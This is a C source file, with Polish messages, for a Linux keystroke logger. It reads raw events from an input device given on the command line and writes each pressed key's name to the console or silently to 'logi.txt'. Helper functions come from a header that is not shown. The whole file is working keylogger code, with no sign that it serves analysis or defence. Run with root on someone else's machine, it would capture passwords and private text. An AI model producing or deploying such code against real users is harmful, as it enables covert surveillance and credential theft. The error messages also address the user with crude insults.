#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
#include <signal.h>
#include "utilities.h"

int main(int argc, char *argv[]){
  if(argc < 2){
    printf("Za mało argumentów gagatku\n");
    exit(-1);
  }

  signal(SIGINT, emergency_exit);
  
  int opt;
  char *dir = NULL;
  int console = 0;

  while((opt = getopt(argc,argv, "D:c")) != -1){
    switch(opt){
    case 'D':
      dir = optarg;
      break;
    case 'c':
      console = 1;
      break;
    default:
      fprintf(stderr, "%s -D <ścieżka>\n", argv[0]);
      exit(-1);
    }
  }

  if (dir == NULL){
    fprintf(stderr, "Podaj ścieżkę jełopie\n");
    exit(-1);
  }
  
  fd = open(dir, O_RDONLY, 0);
  if(fd == -1){
    printf("Zła ścieżka/Użyj sudo jełopie\n");
    exit(-1);
  }
  //printf("Opened file descriptor: %d\n", fd);
  struct input_event ie;
  
  if(console == 0){
    fptr = fopen("logi.txt", "w");
  }
  
  while(1){
    if(read(fd, &ie, sizeof(ie)) != sizeof(ie)){
      break;
    }
    if(console == 1 && ie.type == EV_KEY && ie.value == 1){
      printf("Klawisz: %s\n", get_key_name(ie.code));
    }
    else if(ie.type == EV_KEY && ie.value == 1){
      fprintf(fptr, "%s", get_key_name(ie.code));
    }
  }
  if(fptr) fclose(fptr);
}
